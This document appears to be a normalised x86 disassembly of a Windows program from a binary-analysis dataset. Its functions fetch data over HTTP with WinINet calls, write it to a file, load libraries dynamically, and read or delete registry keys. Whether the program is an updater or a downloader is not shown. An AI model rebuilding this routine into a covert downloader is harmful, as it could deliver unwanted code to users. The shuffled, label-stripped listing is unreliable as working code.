cmp [ eax + 0x14 ] 0x8
jb r-xdata
push edi
push 0x80
push 0x4
push edi
push edi
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov [ esi + 0x4c ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ eax ]
push edi
push eax
call [ GetFileSize@IAT ]
mov [ esi + 0x44 ] eax
mov [ ebp - 0x4 ] edi
test eax eax
je r-xdata
mov ebx 0x800
cmp eax [ esi + 0x40 ]
jae r-xdata
xor ebx ebx
inc ebx
or [ ebp - 0x4 ] 0xffffffff
push edi
push [ esi + 0x4c ]
call [ GetFileSize@IAT ]
mov [ esi + 0x44 ] eax
cmp [ esi + 0x40 ] eax
jne r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x48 ] edi
cmp [ esi + 0x40 ] 0x0
je r-xdata
push edi
lea eax [ ebp - 0x81c ]
push eax
push [ ebp - 0x818 ]
lea eax [ ebp - 0x814 ]
push eax
push [ esi + 0x4c ]
call [ WriteFile@IAT ]
jmp r-xdata
xor eax eax
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x48 ] 0x1
jmp r-xdata
push ebx
lea eax [ ebp - 0x814 ]
push edi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x818 ]
push eax
push ebx
lea eax [ ebp - 0x814 ]
push eax
push [ esi + 0x3c ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
push edi
push edi
push edi
push [ esi + 0x44 ]
push [ esi + 0x3c ]
call eax
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x4c ]
call [ CloseHandle@IAT ]
mov ecx esi
mov [ esi + 0x4c ] edi
call sub_40a9f9
mov eax ebx
push 0x2
push edi
push edi
push [ esi + 0x4c ]
call [ SetFilePointer@IAT ]
sub_40ac3b
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push 0x20006
push ebx
push 0x80000000
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_40ddfb
test al al
je r-xdata
lea ecx [ ebp - 0x10 ]
call sub_40ddd3
mov ecx [ ebp - 0x8 ]
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
cmp [ ebp - 0x10 ] ebx
je r-xdata
push esi
push [ ebp - 0x10 ]
call [ SHDeleteKeyW@IAT ]
neg eax
sbb al al
inc al
je r-xdata
mov bl 0x1
sub_40aca0
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x7c
mov edi ecx
call sub_40e73f
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_4011f6
mov esi eax
jmp r-xdata
sub esp 0x18
lea eax [ edi + 0x4 ]
mov ecx esp
push eax
call sub_40205d
mov ecx esi
call sub_40123a
sub esp 0x18
lea eax [ edi + 0x1c ]
mov ecx esp
push eax
call sub_40205d
mov ecx esi
call sub_401272
sub esp 0x18
lea eax [ edi + 0x34 ]
mov ecx esp
push eax
call sub_40205d
mov ecx esi
call sub_4012aa
sub esp 0x18
lea eax [ edi + 0x4c ]
mov ecx esp
push eax
call sub_40205d
mov ecx esi
call sub_4012e2
sub esp 0x18
lea eax [ edi + 0x64 ]
mov ecx esp
push eax
call sub_40205d
mov ecx esi
call sub_40131a
pop edi
mov eax esi
pop esi
leave
retn
sub_40ad30
push 0x920
mov eax sub_41db09
call sub_410907
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x8f8 ] esi
mov [ ebp - 0x8fc ] ebx
push 0xf
mov [ ebp - 0x4 ] ebx
pop edi
mov [ ebp - 0x86c ] edi
mov [ ebp - 0x870 ] ebx
mov [ ebp - 0x880 ] bl
mov [ ebp - 0x4 ] 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0x8a0 ]
mov [ ebp - 0x88c ] 0x7
mov [ ebp - 0x890 ] ebx
mov [ ebp - 0x8a0 ] ax
call sub_4022ce
xor eax eax
mov [ ebp - 0x4 ] 0x2
push 0x206
mov [ ebp - 0x468 ] ax
lea eax [ ebp - 0x466 ]
push ebx
push eax
call sub_414160
xor eax eax
push 0x206
mov [ ebp - 0x260 ] ax
lea eax [ ebp - 0x25e ]
push ebx
push eax
call sub_414160
push 0x3c
lea eax [ ebp - 0x8dc ]
push ebx
push eax
call sub_414160
add esp 0x24
cmp [ ebp + 0x20 ] 0x8
mov ecx 0x103
lea eax [ ebp - 0x468 ]
mov [ ebp - 0x8cc ] eax
mov [ ebp - 0x8c8 ] ecx
mov [ ebp - 0x8ac ] ecx
lea ecx [ ebp - 0x8dc ]
push ecx
lea eax [ ebp - 0x260 ]
mov [ ebp - 0x8b0 ] eax
push 0x80000000
push [ ebp + 0x1c ]
lea eax [ ebp + 0xc ]
cmovae eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x8dc ] 0x3c
mov [ ebp - 0x8a8 ] ebx
mov [ ebp - 0x8a4 ] ebx
mov [ ebp - 0x8b8 ] ebx
mov [ ebp - 0x8b4 ] ebx
mov [ ebp - 0x8d8 ] ebx
mov [ ebp - 0x8d4 ] ebx
call [ InternetCrackUrlW@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x88c ] 0x8
push ebx
lea eax [ ebp - 0x8a0 ]
cmovae eax [ ebp - 0x8a0 ]
push ebx
push eax
mov [ ebp - 0x8f0 ] ebx
mov [ ebp - 0x8ec ] ebx
mov [ ebp - 0x8dd ] 0x1
call [ InternetOpenW@IAT ]
mov [ ebp - 0x8f4 ] eax
test eax eax
jne r-xdata
mov [ esi + 0x14 ] edi
jmp r-xdata
push ebx
push ebx
push 0x3
mov ecx r--data
push ecx
push ecx
push ebx
lea ecx [ ebp - 0x468 ]
push ecx
push eax
call [ InternetConnectW@IAT ]
mov [ ebp - 0x8f0 ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x908 ]
mov [ ebp - 0x8e4 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x908 ]
lea eax [ ebp - 0x880 ]
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] bl
call sub_4020fe
push ebx
push 0x1
lea ecx [ ebp - 0x8a0 ]
call sub_4023e7
lea ecx [ ebp - 0x880 ]
call sub_40203c
push ebx
push 0x1
lea ecx [ ebp + 0xc ]
call sub_4023e7
mov eax esi
call sub_410859
retn 0x1c
push ebx
push 0x80000100
push ebx
push ebx
push r--data
lea ecx [ ebp - 0x260 ]
push ecx
push r--data
push eax
call [ HttpOpenRequestW@IAT ]
mov edi eax
mov [ ebp - 0x8ec ] edi
test edi edi
jne r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x92c ]
mov [ ebp - 0x8e4 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x92c ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push edi
call [ HttpSendRequestW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x920 ]
mov [ ebp - 0x8e4 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x920 ]
jmp r-xdata
push eax
call sub_4107db
push ebx
lea eax [ ebp - 0x888 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push 0x5
push edi
mov [ ebp - 0x888 ] 0x40
call [ HttpQueryInfoW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8e4 ]
push eax
lea ecx [ ebp - 0x914 ]
mov [ ebp - 0x8e4 ] r--data
call sub_40f72b
push r--data
lea eax [ ebp - 0x914 ]
jmp r-xdata
mov edx 0x400
mov ecx edx
mov [ ebp - 0x8e8 ] edx
lea eax [ ebp - 0x58 ]
push eax
call sub_40eb4f
pop ecx
mov ecx eax
mov [ ebp - 0x8e8 ] ecx
mov edx 0x400
jmp r-xdata
mov eax [ ebp - 0x884 ]
add [ ebp - 0x8e4 ] eax
sub [ ebp - 0x8e8 ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x8dd ] bl
jmp r-xdata
mov [ ebp - 0x8e4 ] ebx
test edi edi
je r-xdata
push eax
lea eax [ ebp - 0x868 ]
push eax
lea ecx [ ebp - 0x880 ]
call sub_40924a
mov ecx [ ebp - 0x8e8 ]
mov edx 0x400
test ecx ecx
jg r-xdata
mov edi [ InternetCloseHandle@IAT ]
push edi
mov edi [ InternetCloseHandle@IAT ]
call edi
jmp r-xdata
mov eax ecx
cmp ecx edx
lea ecx [ ebp - 0x884 ]
push ecx
cmovae eax edx
push eax
lea eax [ ebp - 0x868 ]
push eax
push edi
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8f4 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ebp - 0x8f0 ]
test eax eax
je r-xdata
mov al [ ebp - 0x8dd ]
mov [ esi + 0x14 ] 0xf
push eax
call edi
sub_40b121
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41da80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2d8 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp [ esi + 0x74 ] ebx
lea eax [ esi + 0x64 ]
mov edx rw-data
cmovne edx eax
push edx
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x18 ] ebx
call sub_40205d
mov [ esp + 0x2e0 ] ebx
mov ebx r--data
push ebx
lea edx [ esi + 0x1c ]
lea ecx [ esp + 0x20 ]
call sub_402bb0
pop ecx
mov edx eax
lea eax [ esi + 0x34 ]
push eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0x2e4 ] 0x1
call sub_40d904
pop ecx
push ebx
mov edx eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2e4 ] 0x2
call sub_409419
pop ecx
mov edx eax
lea eax [ esi + 0x4c ]
push eax
lea ecx [ esp + 0x68 ]
mov [ esp + 0x2e4 ] 0x3
call sub_40d904
pop ecx
push ebx
mov edx eax
lea ecx [ esp + 0x98 ]
mov [ esp + 0x2e4 ] 0x4
call sub_409419
pop ecx
xor ebx ebx
push 0x0
inc ebx
push ebx
lea ecx [ esp + 0x6c ]
call sub_4023e7
push 0x0
push ebx
lea ecx [ esp + 0x54 ]
call sub_4023e7
push 0x0
push ebx
lea ecx [ esp + 0x3c ]
call sub_4023e7
push 0x0
push ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x2e8 ] 0x9
call sub_4023e7
xor eax eax
push 0x206
push eax
mov [ esp + 0xcc ] ax
lea eax [ esp + 0xce ]
push eax
call sub_414160
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0xc8 ]
push r--data
push eax
call sub_40ea89
add esp 0xc
lea ecx [ esp + 0xc4 ]
call sub_40102f
push eax
lea eax [ esp + 0xc8 ]
push eax
lea ecx [ esp + 0x9c ]
call sub_402546
and [ esp + 0x8c ] 0x0
xor eax eax
or ebx 0xffffffff
push ebx
push eax
push rw-data
lea ecx [ esp + 0x88 ]
mov [ esp + 0x9c ] 0x7
mov [ esp + 0x88 ] ax
call sub_40223f
push ebx
push 0x0
lea eax [ esi + 0x4 ]
push eax
lea ecx [ esp + 0x88 ]
mov [ esp + 0x2ec ] 0xa
call sub_4024a4
mov esi r--data
mov ecx esi
call sub_40102f
push eax
push esi
lea ecx [ esp + 0x84 ]
call sub_402546
push ebx
push 0x0
lea eax [ esp + 0xb4 ]
push eax
lea ecx [ esp + 0x88 ]
call sub_4024a4
mov esi r--data
mov ecx esi
call sub_40102f
push eax
push esi
lea ecx [ esp + 0x84 ]
call sub_402546
push ebx
xor ebx ebx
push ebx
lea eax [ esp + 0x9c ]
push eax
lea ecx [ esp + 0x88 ]
call sub_4024a4
sub esp 0x18
lea eax [ esp + 0x94 ]
mov ecx esp
push eax
call sub_40205d
push edi
call sub_40ad30
push ebx
push 0x1
lea ecx [ esp + 0x84 ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ esp + 0x9c ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ esp + 0xb4 ]
call sub_4023e7
mov eax edi
mov ecx [ esp + 0x2d8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x2c0 ]
xor ecx esp
call sub_40e09b
mov esp ebp
pop ebp
retn 0x8
sub_40b3b0
push 0x3c
mov eax sub_41dac6
call sub_41089b
mov esi ecx
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x74 ] ebx
lea eax [ esi + 0x64 ]
mov ecx rw-data
cmovne ecx eax
push ecx
lea ecx [ ebp - 0x40 ]
call sub_40205d
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x18 ] ebx
xor eax eax
or ebx 0xffffffff
push ebx
push eax
push rw-data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x28 ] ax
call sub_40223f
push ebx
push 0x0
lea eax [ esi + 0x4 ]
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x2
call sub_4024a4
mov esi r--data
mov ecx esi
call sub_40102f
push eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_402546
push ebx
push 0x0
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4024a4
mov esi r--data
mov ecx esi
call sub_40102f
push eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_402546
push ebx
xor ebx ebx
push ebx
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_4024a4
sub esp 0x18
lea eax [ ebp - 0x28 ]
mov ecx esp
push eax
call sub_40205d
push edi
call sub_40ad30
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp + 0xc ]
call sub_4023e7
mov eax edi
call sub_41084a
retn 0x1c
sub_40b4a3
push 0x4
mov eax sub_41d5b1
call sub_410868
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x8 ]
xor ebx ebx
push 0x7
mov [ esi ] r--data
mov [ esi + 0x4 ] bl
pop edx
xor eax eax
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x10 ] ebx
mov [ ecx ] ax
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x34 ] edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] edx
mov [ esi + 0x48 ] ebx
mov [ esi + 0x38 ] ax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x58 ] ebx
mov [ esi + 0x5c ] ebx
mov [ esi + 0x60 ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x7c ] ebx
mov [ esi + 0x98 ] edx
mov [ esi + 0x94 ] ebx
mov [ esi + 0x84 ] ax
mov [ ebp - 0x4 ] dl
push r--data
mov [ esi + 0x9c ] ebx
call sub_4022ce
mov ecx esi
call sub_40b9fa
mov ecx esi
call sub_40bb24
mov eax esi
call sub_410836
retn
sub_40b547
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x9c ]
xor ebx ebx
mov [ esi ] r--data
test edi edi
je r-xdata
xor edi edi
push ebx
inc edi
push edi
lea ecx [ esi + 0x84 ]
call sub_4023e7
lea ecx [ esi + 0x74 ]
call sub_40d733
lea ecx [ esi + 0x68 ]
call sub_40d733
lea ecx [ esi + 0x5c ]
call sub_40d733
lea ecx [ esi + 0x50 ]
call sub_40d733
push ebx
push edi
lea ecx [ esi + 0x38 ]
call sub_4023e7
push ebx
push edi
lea ecx [ esi + 0x20 ]
call sub_4023e7
push ebx
push edi
lea ecx [ esi + 0x8 ]
call sub_4023e7
pop edi
pop esi
pop ebx
retn
mov ecx edi
call sub_401358
push edi
call j_sub_40e8f2#2
pop ecx
mov [ esi + 0x9c ] ebx
sub_40b5c4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41d87b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
cmp [ esi + 0x94 ] ebx
je r-xdata
mov ecx [ esi + 0x9c ]
push 0x64
mov eax [ ecx ]
lea edx [ esp + 0x4c ]
push edx
call [ eax + 0x4 ]
lea ecx [ esp + 0x48 ]
call sub_40203c
mov ecx esi
call sub_40b9fa
test al al
je r-xdata
sub esp 0x18
lea eax [ esi + 0x84 ]
mov ecx esp
push eax
call sub_40205d
mov ecx [ esi + 0x9c ]
call sub_40131a
mov ecx [ esi + 0x9c ]
push 0x65
mov eax [ ecx ]
lea edx [ esp + 0x34 ]
push edx
call [ eax + 0x4 ]
lea ecx [ esp + 0x30 ]
call sub_40203c
xor al al
cmp [ esi + 0x48 ] 0x2
jb r-xdata
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push edi
push 0x2
push ecx
lea ecx [ esi + 0x38 ]
call sub_402ee3
test eax eax
jne r-xdata
mov ecx [ esi + 0x9c ]
push 0x66
mov eax [ ecx ]
lea edx [ esp + 0x18 ]
push edx
call [ eax + 0x4 ]
lea ecx [ esp + 0x14 ]
call sub_40203c
push r--data
lea edx [ esi + 0x20 ]
lea ecx [ esp + 0x4c ]
call sub_402bb0
pop ecx
lea eax [ esp + 0x48 ]
push eax
mov ecx esi
mov [ esp + 0x74 ] ebx
call sub_40bbfa
call sub_40c0ed
mov ecx esi
call sub_40c169
mov edi rw-data
push [ edi ]
lea ecx [ esp + 0x18 ]
call sub_402085
lea ecx [ esp + 0x14 ]
mov [ esp + 0x70 ] 0x1
call sub_40cf9b
push ebx
push 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x78 ] bl
call sub_4023e7
add edi 0x4
cmp edi rw-data
jl r-xdata
mov ecx esi
call sub_40c1b5
mov ecx esi
call sub_40cb07
mov ecx esi
call sub_40c845
mov ecx esi
call sub_40c360
mov ecx esi
call sub_40cc37
mov ecx [ esi + 0x9c ]
push 0x67
mov edx [ ecx ]
lea esi [ esp + 0x18 ]
push esi
call [ edx + 0x4 ]
mov ecx esi
call sub_40203c
push ebx
push 0x1
lea ecx [ esp + 0x50 ]
call sub_4023e7
mov al 0x1
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_40e09b
mov esp ebp
pop ebp
retn
sub_40b781
push 0x24c
mov eax sub_41d943
call sub_41089b
mov edi ecx
xor ecx ecx
cmp [ edi + 0x30 ] ecx
je r-xdata
xor eax eax
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x234 ] ax
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x23c ] ecx
mov [ ebp - 0x238 ] ecx
push 0x20019
push r--data
push 0x80000002
lea ecx [ ebp - 0x23c ]
mov [ ebp - 0x4 ] 0x1
call sub_40ddfb
lea eax [ ebp - 0x234 ]
push eax
push r--data
lea ecx [ ebp - 0x23c ]
call sub_40de2a
mov ebx [ PathFileExistsW@IAT ]
push 0x5c
pop esi
test al al
je r-xdata
mov al 0x1
jmp r-xdata
lea ecx [ ebp - 0x23c ]
call sub_40ddd3
cmp [ edi + 0x30 ] 0x0
jne r-xdata
push ecx
push ecx
lea eax [ ebp - 0x240 ]
push eax
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x240 ] esi
call sub_40d76b
cmp eax 0xffffffff
je r-xdata
call sub_41084a
retn
lea ecx [ ebp - 0x23c ]
setne bl
call sub_40ddd3
push 0x0
push 0x1
lea ecx [ ebp - 0x234 ]
call sub_4023e7
mov al bl
xor eax eax
push 0x206
push eax
mov [ ebp - 0x21c ] ax
lea eax [ ebp - 0x21a ]
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x21c ]
push 0x104
push eax
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
je r-xdata
push eax
push 0x0
lea eax [ ebp - 0x258 ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_40d697
push eax
lea ecx [ ebp - 0x234 ]
call sub_4020cf
push 0x0
push 0x1
lea ecx [ ebp - 0x258 ]
call sub_4023e7
lea ecx [ ebp - 0x234 ]
call sub_40daf2
push r--data
lea edx [ ebp - 0x234 ]
lea ecx [ ebp - 0x258 ]
call sub_402bb0
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
cmp [ edi + 0x30 ] 0x0
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_4022ce
lea ecx [ ebp - 0x234 ]
call sub_40daf2
mov eax [ ebp - 0x224 ]
dec eax
push eax
lea ecx [ ebp - 0x234 ]
call sub_40d672
cmp [ eax ] si
jne r-xdata
push eax
call ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x258 ]
mov esi eax
call sub_4023e7
test esi esi
je r-xdata
mov eax [ eax ]
mov esi r--data
mov ecx esi
call sub_40102f
push eax
push esi
lea ecx [ ebp - 0x234 ]
call sub_402546
push 0xffffffff
push 0x0
lea eax [ edi + 0x8 ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_4024a4
push r--data
lea edx [ ebp - 0x234 ]
lea ecx [ ebp - 0x258 ]
call sub_402bb0
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
mov eax [ ebp - 0x224 ]
dec eax
push eax
lea ecx [ ebp - 0x234 ]
call sub_4025e7
push 0x5c
pop esi
lea ecx [ edi + 0x20 ]
lea eax [ ebp - 0x234 ]
cmp ecx eax
je r-xdata
push eax
call ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x258 ]
mov esi eax
call sub_4023e7
test esi esi
je r-xdata
mov eax [ eax ]
push 0xffffffff
push 0x0
push eax
call sub_40223f
lea ecx [ edi + 0x20 ]
lea eax [ ebp - 0x234 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_40223f
sub_40b9fa
push 0x54
mov eax sub_41d983
call sub_41089b
mov esi ecx
xor ebx ebx
cmp [ esi + 0x48 ] ebx
je r-xdata
call sub_40b781
test al al
je r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ esi + 0x48 ] ebx
setne al
xor eax eax
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] ax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
push 0x20019
push r--data
push 0x80000002
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x1
call sub_40ddfb
lea eax [ ebp - 0x30 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_40de2a
test al al
je r-xdata
call sub_41084a
retn
lea ecx [ ebp - 0x18 ]
call sub_40ddd3
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x30 ]
call sub_40daf2
lea ecx [ esi + 0x38 ]
lea eax [ ebp - 0x30 ]
cmp ecx eax
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40ddd3
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_4023e7
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push edi
lea ecx [ esi + 0x20 ]
call sub_402546
push eax
lea ecx [ ebp - 0x48 ]
call sub_40205d
lea edx [ ebp - 0x48 ]
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x2
call sub_40d54a
push eax
lea ecx [ ebp - 0x30 ]
call sub_4020cf
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
call sub_4023e7
lea ecx [ ebp - 0x30 ]
call sub_40daf2
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push 0xffffffff
push ebx
push eax
call sub_40223f
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_4023e7
lea ecx [ esi + 0x38 ]
lea eax [ ebp - 0x30 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push ebx
push eax
call sub_40223f
sub_40bb24
push 0x2c
mov eax sub_41d908
call sub_41089b
mov esi ecx
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
xor eax eax
mov [ ebp - 0x20 ] 0x7
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x34 ] ax
push 0x20019
push r--data
push 0x80000002
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_40ddfb
lea eax [ ebp - 0x34 ]
push eax
push r--data
lea ecx [ ebp - 0x1c ]
call sub_40de2a
test al al
je r-xdata
lea ecx [ ebp - 0x1c ]
call sub_40ddd3
lea ecx [ esi + 0x84 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
lea ecx [ esi + 0x84 ]
lea eax [ ebp - 0x34 ]
cmp ecx eax
je r-xdata
mov edi ecx
mov edi [ ecx ]
jmp r-xdata
push 0xffffffff
push ebx
push eax
call sub_40223f
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push edi
push eax
push ecx
lea ecx [ ebp - 0x38 ]
call sub_40dc9f
add esp 0xc
cmp [ esi + 0x94 ] ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
setne bl
call sub_4023e7
lea ecx [ ebp - 0x1c ]
call sub_40ddd3
mov al bl
call sub_41084a
retn
mov ecx [ ecx ]
cmp [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x10 ]
lea eax [ edx + eax * 2 ]
jb r-xdata
sub_40bbfa
push 0x180
mov eax sub_41da0b
call sub_41089b
mov [ ebp - 0x18c ] ecx
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x10 ] 0x0
je r-xdata
xor al al
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor eax eax
mov esi eax
mov ebx eax
mov [ ebp - 0x188 ] esi
mov [ ebp - 0x184 ] ebx
mov [ ebp - 0x180 ] eax
mov [ ebp - 0x4 ] eax
push 0x103
push eax
mov [ ebp - 0x11c ] al
lea eax [ ebp - 0x11b ]
push eax
call sub_414160
add esp 0xc
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push r--data
push edi
call sub_40eb63
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
mov edi [ edi ]
and [ ebp - 0x124 ] 0x0
xor eax eax
mov [ ebp - 0x120 ] 0x7
mov [ ebp - 0x134 ] ax
mov [ ebp - 0x4 ] 0x4
cmp esi ebx
je r-xdata
push edi
lea eax [ ebp - 0x11c ]
push 0x104
push eax
call sub_40f268
add esp 0xc
test eax eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x134 ]
call sub_4023e7
lea ecx [ ebp - 0x188 ]
call sub_40d733
mov al 0x1
jmp r-xdata
mov edi [ ebp - 0x18c ]
push edi
call sub_40ecae
pop ecx
xor ebx ebx
mov esi 0x104
call sub_41084a
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea eax [ ebp - 0x11c ]
push eax
call sub_401089
pop ecx
push eax
lea eax [ ebp - 0x11c ]
push eax
lea ecx [ ebp - 0x14c ]
call sub_40242b
cmp [ ebp - 0x138 ] 0x10
lea edx [ ebp - 0x14c ]
cmovae edx [ ebp - 0x14c ]
lea ecx [ ebp - 0x164 ]
call sub_40dbac
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x150 ] 0x8
lea eax [ ebp - 0x164 ]
cmovae eax [ ebp - 0x164 ]
push eax
lea ecx [ ebp - 0x17c ]
call sub_402085
lea eax [ ebp - 0x17c ]
push eax
lea ecx [ ebp - 0x188 ]
mov [ ebp - 0x4 ] 0x3
call sub_40d6c8
push ebx
push 0x1
lea ecx [ ebp - 0x17c ]
call sub_4023e7
push ebx
push 0x1
lea ecx [ ebp - 0x164 ]
call sub_4023e7
cmp [ ebp + eax - 0x11d ] 0xa
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push r--data
jmp r-xdata
push r--data
push eax
call sub_40f8e0
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x138 ] 0xf
mov [ ebp - 0x13c ] ebx
mov [ ebp - 0x14c ] bl
lea eax [ ebp - 0x11c ]
push eax
mov [ ebp - 0x4 ] 0x1
call [ lstrlenA@IAT ]
cmp eax esi
jge r-xdata
mov ebx [ ebp - 0x184 ]
mov esi [ ebp - 0x188 ]
cmp eax 0x1
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
